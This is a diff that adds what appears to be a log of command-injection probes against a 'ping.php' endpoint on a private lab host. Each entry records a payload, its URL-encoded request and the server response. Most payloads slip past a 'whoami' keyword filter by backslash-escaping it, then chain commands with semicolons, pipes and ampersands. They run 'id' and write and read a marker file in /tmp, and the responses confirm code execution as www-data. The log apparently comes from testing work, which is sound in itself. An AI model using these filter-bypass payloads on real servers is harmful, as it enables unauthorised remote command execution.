@@ -1,0 +1,50 @@
+################ F1_nonce_content_write
+RAW_PARAM: w\h\o\a\m\i;echo CHOCOPING73-4bccb96faa6a > /tmp/opencode-marker-73-CHOCOPING73-4bccb96faa6a
+ENCODED: http://172.17.0.8/ping.php?ip=w%5Ch%5Co%5Ca%5Cm%5Ci%3Becho%20CHOCOPING73-4bccb96faa6a%20%3E%20%2Ftmp%2Fopencode-marker-73-CHOCOPING73-4bccb96faa6a
+BODY: <pre></pre><pre>www-data
+</pre>|HTTP=200|BYTES=31
+
+################ F2_read_marker_back_through_sink
+RAW_PARAM: w\h\o\a\m\i;cat /tmp/opencode-marker-73-CHOCOPING73-4bccb96faa6a
+ENCODED: http://172.17.0.8/ping.php?ip=w%5Ch%5Co%5Ca%5Cm%5Ci%3Bcat%20%2Ftmp%2Fopencode-marker-73-CHOCOPING73-4bccb96faa6a
+BODY: <pre></pre><pre>www-data
+CHOCOPING73-4bccb96faa6a
+</pre>|HTTP=200|BYTES=56
+
+################ G1_metachar_semicolon
+RAW_PARAM: w\h\o\a\m\i;id
+ENCODED: http://172.17.0.8/ping.php?ip=w%5Ch%5Co%5Ca%5Cm%5Ci%3Bid
+BODY: <pre></pre><pre>www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre>|HTTP=200|BYTES=63
+
+################ G2_metachar_pipe
+RAW_PARAM: w\h\o\a\m\i|id
+ENCODED: http://172.17.0.8/ping.php?ip=w%5Ch%5Co%5Ca%5Cm%5Ci%7Cid
+BODY: <pre></pre><pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre>|HTTP=200|BYTES=60
+
+################ G3_metachar_ampersand
+RAW_PARAM: w\h\o\a\m\i&id
+ENCODED: http://172.17.0.8/ping.php?ip=w%5Ch%5Co%5Ca%5Cm%5Ci%26id
+BODY: <pre></pre><pre>www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre>|HTTP=200|BYTES=63
+
+################ G4_metachar_backtick
+RAW_PARAM: w\h\o\a\m\i`id`
+ENCODED: http://172.17.0.8/ping.php?ip=w%5Ch%5Co%5Ca%5Cm%5Ci%60id%60
+BODY: <pre></pre><pre></pre>|HTTP=200|BYTES=22
+
+################ G5_literal_whoami_no_backslash_CONTROL
+RAW_PARAM: whoami;id
+ENCODED: http://172.17.0.8/ping.php?ip=whoami%3Bid
+BODY: Comando no permitido.|HTTP=200|BYTES=21
+
+################ H1_partial_backslash_prefix
+RAW_PARAM: w\h\o\a\m\i;id
+ENCODED: http://172.17.0.8/ping.php?ip=w%5Ch%5Co%5Ca%5Cm%5Ci%3Bid
+BODY: <pre></pre><pre>www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre>|HTTP=200|BYTES=63
+
